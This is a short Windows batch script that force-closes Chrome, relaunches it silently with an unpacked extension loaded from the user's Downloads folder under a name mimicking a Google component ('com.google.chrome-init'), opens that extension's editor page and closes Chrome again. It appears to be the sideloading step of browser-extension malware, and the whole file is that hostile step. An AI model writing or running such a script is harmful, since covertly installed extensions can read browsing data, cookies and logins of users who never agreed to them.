@echo off

cmd.exe /C taskkill.exe /F /IM chrome.exe

timeout /t 3 /nobreak

cmd.exe /C start /B c:\"Program Files"\Google\Chrome\Application\chrome.exe --load-extension=C:\Users\%USERNAME%\Downloads\com.google.chrome-init\com.google-chrome-init "https://www.google.com"

timeout /t 3 /nobreak

cmd.exe /C start /B c:\"Program Files"\Google\Chrome\Application\chrome.exe "chrome-extension://lpmockibcakojclnfmhchibmdpmollgn/editor.html?store=0"

timeout /t 4 /nobreak

cmd.exe /C taskkill.exe /F /IM chrome.exe

exit 0
